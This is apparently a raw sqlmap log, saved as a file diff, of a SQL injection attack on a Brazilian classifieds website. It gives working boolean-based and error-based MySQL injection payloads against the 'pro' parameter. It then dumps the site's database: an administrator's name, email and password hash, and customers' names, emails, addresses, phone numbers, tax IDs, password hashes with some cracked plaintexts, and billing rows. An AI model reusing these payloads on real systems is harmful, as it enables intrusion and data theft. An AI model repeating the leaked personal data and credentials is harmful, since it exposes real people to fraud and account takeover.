@@ -1,0 +1,251 @@
+sqlmap identified the following injection point(s) with a total of 414 HTTP(s) requests:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] classifi_vca
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: classifi_vca
+[26 tables]
++---------------------+
+| banners             |
+| banners2013         |
+| bannersi            |
+| chat                |
+| cidades             |
+| cliente             |
+| clientes_boleto     |
+| configuracao        |
+| conversas           |
+| desejos             |
+| emoticons           |
+| foto                |
+| fotos_anuncios      |
+| mural               |
+| noticias            |
+| notificacoes        |
+| online              |
+| perguntas           |
+| produtos            |
+| produtos_categorias |
+| produtos_sub        |
+| redessociais        |
+| search              |
+| texto               |
+| ticket              |
+| usuario             |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: classifi_vca
+Table: usuario
+[1 entry]
++-----+--------------------+---------------------------------------+----------------------------------+-----------+-----------+------------+
+| obs | nome               | email                                 | u3_senha                         | u1_codigo | u4_perfil | u2_usuario |
++-----+--------------------+---------------------------------------+----------------------------------+-----------+-----------+------------+
+| .   | Wellington Moreira | contato@classificadosconquista.com.br | bd15a37d697c1cfde7960ee4e7ae0ea8 | 1         | <blank>   | cconquista |
++-----+--------------------+---------------------------------------+----------------------------------+-----------+-----------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: classifi_vca
+Table: cliente
+[4 entries]
++---------------+-----------+---------+---------+---------+------+------------------------------+------------+---------+--------------------+-------------------------------------------+--------------------------+-------+---------+--------+---------+--------+---------+---------+---------+-------------+---------+----------------------------+-------------------+
+| cidade        | cpf       | obs     | site    | logo    | tipo | nome                         | data       | cnpj    | foto               | senha                                     | email                    | plano | login   | status | estado  | codigo | empresa | tel_cel | tel_fax | tel_res     | tel_tra | endereco                   | descricao         |
++---------------+-----------+---------+---------+---------+------+------------------------------+------------+---------+--------------------+-------------------------------------------+--------------------------+-------+---------+--------+---------+--------+---------+---------+---------+-------------+---------+----------------------------+-------------------+
+| <blank>       | <blank>   | <blank> | <blank> | <blank> | 0    | Alessandra Oliveira Oliveira | 2017-12-25 | <blank> | <blank>            | 0                                         | <blank>                  | 0     | <blank> | 1      | <blank> | 10     | <blank> | <blank> | <blank> | <blank>     | <blank> | <blank>                    | 10213148365297847 |
+| <blank>       | <blank>   | <blank> | <blank> | <blank> | 0    | Elisandro JosÃ© Figueiredo   | 2017-12-30 | <blank> | <blank>            | 0                                         | <blank>                  | 0     | <blank> | 1      | <blank> | 15     | <blank> | <blank> | <blank> | <blank>     | <blank> | <blank>                    | 2049130968653673  |
+| <blank>       | <blank>   | <blank> | <blank> | <blank> | 0    | Vitor Hugo Lacerda           | 2018-02-27 | <blank> | <blank>            | 0                                         | <blank>                  | 0     | <blank> | 1      | <blank> | 20     | <blank> | <blank> | <blank> | <blank>     | <blank> | <blank>                    | 1569377776479389  |
+| eastportplaza | 04575-010 | <blank> | <blank> | <blank> | 1    | Alessia Valentina            | 2018-06-29 | 1       | 29062018051309.jpg | *CBCA678DEE4AEF0ABC0102CD0CACA975D8C33DBC | valen.rizzello@gmail.com | 0     | <blank> | 1      | or      | 30     | <blank> | 2015690 | <blank> | 14302015690 | <blank> | Eastport plaza portland OR | <blank>           |
++---------------+-----------+---------+---------+---------+------+------------------------------+------------+---------+--------------------+-------------------------------------------+--------------------------+-------+---------+--------+---------+--------+---------+---------+---------+-------------+---------+----------------------------+-------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: classifi_vca
+Table: cliente
+[23 entries]
++--------------------+-------------------------------------------------------+
+| cpf                | senha                                                 |
++--------------------+-------------------------------------------------------+
+| <blank>            | 0                                                     |
+| <blank>            | 0                                                     |
+| <blank>            | 0                                                     |
+| <blank>            | 0                                                     |
+| 000.000.000-00     | *37EF302E02B96085FE733F2A01F004A59CDA7C95             |
+| 000000000000       | *DABCF719388B72AD432DE5E88423B56D652DD8B0 (987654321) |
+| 00152401504        | *54FCEC35399B6BB71D2DD9C3AB69E5B34B7F427B (matrix)    |
+| 01095653393        | *50DA813DFB04A468A6EE08E61712D15F742F260E             |
+| 01261666500        | *7541561BF205D33B4940CF1DEC861AC08F5FCC6A             |
+| 04378931540        | *54FCEC35399B6BB71D2DD9C3AB69E5B34B7F427B (matrix)    |
+| 04575-010          | *CBCA678DEE4AEF0ABC0102CD0CACA975D8C33DBC             |
+| 06871231000157     | *AABC76C38F6A3DC7692149CD06A0E31BF6A71BBC             |
+| 0916587487         | *54FCEC35399B6BB71D2DD9C3AB69E5B34B7F427B (matrix)    |
+| 10264618000112     | *54FCEC35399B6BB71D2DD9C3AB69E5B34B7F427B (matrix)    |
+| 111111111111       | 0                                                     |
+| 14.340.674.0001/40 | *2A4ADCE835A9617B672C4796FF0FD4A5F230731C             |
+| 23749854000170     | 0                                                     |
+| 34.177.030/0005-13 | *82D9FABA453F4319A7FA67DB4E0E753C3313CBC8             |
+| 462.282.670-43     | *029ED90083ED7CD7145249ABB22D26A17D883C09             |
+| 539.033.010-27     | *029ED90083ED7CD7145249ABB22D26A17D883C09             |
+| 69256236520        | *7DBD344B3B8065C98682E949D8EF936137A69ED6             |
+| 714.112.570-14     | *029ED90083ED7CD7145249ABB22D26A17D883C09             |
+| 94301760563        | *54FCEC35399B6BB71D2DD9C3AB69E5B34B7F427B (matrix)    |
++--------------------+-------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: classifi_vca
+Table: configuracao
+[0 entries]
++--------+--------+------------+
+| titulo | codigo | manutencao |
++--------+--------+------------+
++--------+--------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: classifi_vca
+Table: clientes_boleto
+[5 entries]
++------+------+-------+-------+-----------------------------------------------------+----------+-------------+--------------+--------------+---------------+---------------+----------------+-----------------+
+| pago | dias | forma | valor | periodo                                             | cd_plano | observacoes | data_emissao | nosso_numero | data_confirma | codigo_boleto | codigo_cliente | data_vencimento |
++------+------+-------+-------+-----------------------------------------------------+----------+-------------+--------------+--------------+---------------+---------------+----------------+-----------------+
+| 0    | 15   | 2     | 15.00 | Deposito/Transferencia - Dias: 15 - Valor: R$ 15.00 | 0        | 1           | 2018-05-24   | 0            | 0000-00-00    | 5             | 9              | 2018-05-24      |
+| 0    | 15   | 2     | 15.00 | Deposito/Transferencia - Dias: 15 - Valor: R$ 15.00 | 0        | 111111      | 2018-01-05   | 0            | 0000-00-00    | 2             | 1              | 2018-01-05      |
+| 0    | 15   | 2     | 15.00 | Deposito/Transferencia - Dias: 15 - Valor: R$ 15.00 | 0        | 111111      | 2018-01-05   | 0            | 0000-00-00    | 3             | 1              | 2018-01-05      |
+| 0    | 15   | 2     | 15.00 | Deposito/Transferencia - Dias: 15 - Valor: R$ 15.00 | 0        | 3333        | 2018-05-24   | 0            | 0000-00-00    | 5             | 9              | 2018-05-24      |
+| 0    | 20   | 2     | 20.00 | Deposito/Transferencia - Dias: 20 - Valor: R$ 20.00 | 0        | teste       | 2018-01-05   | 0            | 0000-00-00    | 4             | 1              | 2018-01-05      |
++------+------+-------+-------+-----------------------------------------------------+----------+-------------+--------------+--------------+---------------+---------------+----------------+-----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pro (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: desejos=add&pro=225880 AND 3308=3308
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: desejos=add&pro=225880 AND (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71626b7671,(SELECT (ELT(7064=7064,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: classifi_vca
+Table: ticket
+[0 entries]
++--------+---------+----------+-----------+
+| codigo | produto | vendedor | comprador |
++--------+---------+----------+-----------+
++--------+---------+----------+-----------+
+
